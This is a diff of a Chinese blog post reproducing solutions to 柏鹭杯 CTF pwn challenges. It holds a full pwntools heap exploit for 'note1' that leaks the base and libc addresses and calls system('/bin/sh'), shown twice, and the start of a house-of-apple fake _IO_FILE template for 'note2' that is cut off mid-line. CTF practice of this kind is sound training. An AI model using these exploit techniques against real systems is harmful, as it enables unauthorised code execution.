@@ -1,160 +1,227 @@
-
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#FFF">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
 
 
-<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
-<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/css/main.css">
 
-<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
-  
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="柏鹭杯复现note1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *banary &#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="柏鹭杯">
+<meta property="og:url" content="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="柏鹭杯复现note1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *banary &#x3D;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-09-22T12:50:25.000Z">
+<meta property="article:modified_time" content="2022-10-02T06:23:09.369Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
 
 <link rel="canonical" href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/">
 
 
 
-  <title>
-柏鹭杯 - cometition |
-youlin = Hexo</title>
-<meta name="generator" content="Hexo 6.0.0"></head>
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div id="loading">
-    <div class="cat">
-      <div class="body"></div>
-      <div class="head">
-        <div class="face"></div>
-      </div>
-      <div class="foot">
-        <div class="tummy-end"></div>
-        <div class="bottom"></div>
-        <div class="legs left"></div>
-        <div class="legs right"></div>
-      </div>
-      <div class="paw">
-        <div class="hands left"></div>
-        <div class="hands right"></div>
-      </div>
-    </div>
-  </div>
-  <div id="container">
-    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="inner">
-        <div id="brand">
-          <div class="pjax">
-          
-  <h1 itemprop="name headline">柏鹭杯
-  </h1>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/","path":"2022/09/22/柏鹭杯/","title":"柏鹭杯"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>柏鹭杯 | Hexo</title>
   
-<div class="meta">
-  <span class="item" title="Created: 2022-09-22 20:50:25">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <span class="text">Posted on</span>
-    <time itemprop="dateCreated datePublished" datetime="2022-09-22T20:50:25+08:00">2022-09-22</time>
-  </span>
-</div>
 
 
-          </div>
-        </div>
-        <nav id="nav">
-  <div class="inner">
-    <div class="toggle">
-      <div class="lines" aria-label="Toggle navigation bar">
-        <span class="line"></span>
-        <span class="line"></span>
-        <span class="line"></span>
-      </div>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
     </div>
-    <ul class="menu">
-      <li class="item title"><a href="/" rel="start">youlin</a></li>
-    </ul>
-    <ul class="right">
-      <li class="item theme">
-        <i class="ic i-sun"></i>
-      </li>
-      <li class="item search">
-        <i class="ic i-search"></i>
-      </li>
-    </ul>
   </div>
-</nav>
 
-      </div>
-      <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
-        </ul>
-      </div>
-    </header>
-    <div id="waves">
-      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
-        <defs>
-          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
-        </defs>
-        <g class="parallax">
-          <use xlink:href="#gentle-wave" x="48" y="0" />
-          <use xlink:href="#gentle-wave" x="48" y="3" />
-          <use xlink:href="#gentle-wave" x="48" y="5" />
-          <use xlink:href="#gentle-wave" x="48" y="7" />
-        </g>
-      </svg>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
     </div>
-    <main>
-      <div class="inner">
-        <div id="main" class="pjax">
-          
-  <div class="article wrap">
-    
-<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
-<i class="ic i-home"></i>
-<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
-<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cometition/" itemprop="item" rel="index" title="In cometition"><span itemprop="name">cometition</span></a>
-<meta itemprop="position" content="1" /></span>
+  </div>
 </div>
 
-    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
-  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/">
 
-  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="image" content="/images/avatar.jpg">
-    <meta itemprop="name" content="John Doe">
-    <meta itemprop="description" content=", ">
-  </span>
 
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
 
-  <div class="body md" itemprop="articleBody">
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9F%8F%E9%B9%AD%E6%9D%AF%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">柏鹭杯复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#note1"><span class="nav-number">1.1.</span> <span class="nav-text">note1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#note2"><span class="nav-number">1.2.</span> <span class="nav-text">note2</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
     
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
 
-    <h1 id="柏鹭杯复现"><a href="#柏鹭杯复现" class="headerlink" title="柏鹭杯复现"></a>柏鹭杯复现</h1><h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note1&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(index,size,name,tag,func = 2):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(index))</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    sla(&quot;name: &quot;,name)</span><br><span class="line">    sla(&quot;tag: &quot;,tag)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def edit_name(idx,size,name):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;,name)</span><br><span class="line"></span><br><span class="line">def edit_tag(idx,tag):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendafter(&quot;new tag: &quot;,tag)</span><br><span class="line"></span><br><span class="line">def edit_func(idx,func):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def call(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0,0x420,b&#x27;A&#x27;*0x420,b&#x27;&#x27;)</span><br><span class="line">edit_tag(0, p64(0xdeadbeefdeadbeef))</span><br><span class="line">edit_func(0, 1)</span><br><span class="line">call(0)</span><br><span class="line"></span><br><span class="line">ru(b&#x27;\xef\xbe\xad\xde\xef\xbe\xad\xde&#x27;)</span><br><span class="line">base=u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))-0x131b</span><br><span class="line">print(&quot;base:&quot;+hex(base))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x10,b&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x10,b&#x27;youlin&#x27;,b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+p64(0)+p64(base+0x131b)+p64(base+elf.got[&#x27;puts&#x27;])+p64(0x421))</span><br><span class="line"></span><br><span class="line">call(1)</span><br><span class="line">libcbase = uu64() - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+b&#x27;/bin/sh&#x27;.ljust(0x8,b&#x27;\x00&#x27;)+p64(system))</span><br><span class="line">call(1)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/09/22/%E6%9F%8F%E9%B9%AD%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          柏鹭杯
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-09-22 20:50:25" itemprop="dateCreated datePublished" datetime="2022-09-22T20:50:25+08:00">2022-09-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-10-02 14:23:09" itemprop="dateModified" datetime="2022-10-02T14:23:09+08:00">2022-10-02</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/cometition/" itemprop="url" rel="index"><span itemprop="name">cometition</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="柏鹭杯复现"><a href="#柏鹭杯复现" class="headerlink" title="柏鹭杯复现"></a>柏鹭杯复现</h1><h2 id="note1"><a href="#note1" class="headerlink" title="note1"></a>note1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">banary = &quot;./note1&quot;</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">#libc=ELF(&quot;/home/youlin/tools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&quot;)</span><br><span class="line">ip = &#x27;1.14.71.254&#x27;</span><br><span class="line">port = 28581</span><br><span class="line">local = 1</span><br><span class="line">if local:</span><br><span class="line">    io = process(banary)</span><br><span class="line">else:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)</span><br><span class="line">#context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;)</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sa = lambda text, data : io.sendafter(text, data)</span><br><span class="line">sla = lambda text, data : io.sendlineafter(text, data)</span><br><span class="line">r = lambda : io.recv()</span><br><span class="line">ru = lambda text : io.recvuntil(text)</span><br><span class="line">uu32 = lambda : u32(io.recvuntil(b&quot;\xff&quot;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line">uu64 = lambda : u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;))</span><br><span class="line">iuu32 = lambda : int(io.recv(10),16)</span><br><span class="line">iuu64 = lambda : int(io.recv(12),16)</span><br><span class="line">lg = lambda addr : log.info(addr)</span><br><span class="line">ia = lambda : io.interactive()</span><br><span class="line"></span><br><span class="line">def add(index,size,name,tag,func = 2):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(index))</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    sla(&quot;name: &quot;,name)</span><br><span class="line">    sla(&quot;tag: &quot;,tag)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def edit_name(idx,size,name):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;1&#x27;)</span><br><span class="line">    sla(&quot;name_length: &quot;,str(size))</span><br><span class="line">    io.sendlineafter(&quot;name: &quot;,name)</span><br><span class="line"></span><br><span class="line">def edit_tag(idx,tag):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendafter(&quot;new tag: &quot;,tag)</span><br><span class="line"></span><br><span class="line">def edit_func(idx,func):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;2&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;func: &quot;,str(func))</span><br><span class="line"></span><br><span class="line">def call(idx):</span><br><span class="line">    sla(&quot;&gt; &quot;,b&#x27;3&#x27;)</span><br><span class="line">    sla(&quot;id: &quot;,str(idx))</span><br><span class="line"></span><br><span class="line">add(0,0x420,b&#x27;A&#x27;*0x420,b&#x27;&#x27;)</span><br><span class="line">edit_tag(0, p64(0xdeadbeefdeadbeef))</span><br><span class="line">edit_func(0, 1)</span><br><span class="line">call(0)</span><br><span class="line"></span><br><span class="line">ru(b&#x27;\xef\xbe\xad\xde\xef\xbe\xad\xde&#x27;)</span><br><span class="line">base=u64(io.recv(6).ljust(8, b&#x27;\x00&#x27;))-0x131b</span><br><span class="line">print(&quot;base:&quot;+hex(base))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x10,b&#x27;youlin&#x27;)</span><br><span class="line">add(1,0x10,b&#x27;youlin&#x27;,b&#x27;&#x27;)</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+p64(0)+p64(base+0x131b)+p64(base+elf.got[&#x27;puts&#x27;])+p64(0x421))</span><br><span class="line"></span><br><span class="line">call(1)</span><br><span class="line">libcbase = uu64() - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">print(&quot;libcbase:&quot;+hex(libcbase))</span><br><span class="line">system=libcbase+libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libcbase+next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">edit_name(0,0x41f,p64(0)*3+p64(0x31)+b&#x27;/bin/sh&#x27;.ljust(0x8,b&#x27;\x00&#x27;)+p64(system))</span><br><span class="line">call(1)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
 
 <h2 id="note2"><a href="#note2" class="headerlink" title="note2"></a>note2</h2><p>比较简单的一道题，直接给了uaf，因为一开始用house of banana在本机一直打不通，刚好又看到pursue师傅的博客用的house of apple，刚好了解下house of apple</p>
-<p>house of apple具体原理：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81NDkxMTQyNTc=">https://zhuanlan.zhihu.com/p/549114257</span></p>
+<p>house of apple具体原理：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/549114257">https://zhuanlan.zhihu.com/p/549114257</a></p>
 <p>先将_IO_list_all修改为堆上伪造io的地址，然后利用模板</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_file1 = b&#x27;\x00&#x27; * (0x10)</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_base</span><br><span class="line">fake_file1 += p64(1)    # fp -&gt; _IO_write_ptr</span><br><span class="line">fake_file1 += p64(0)    # fp -&gt; _IO_write_end</span><br><span class="line">fake_file1 = fake_file1.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase)     # _lock</span><br><span class="line">fake_file1 = fake_file1.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(heapbase + 0xf00 + 0x100)    # _wide_data</span><br><span class="line">fake_file1 = fake_file1.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      # vtable</span><br><span class="line">fake_file1 = fake_file1.ljust(0x100 - 0x10, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">fake_wide = 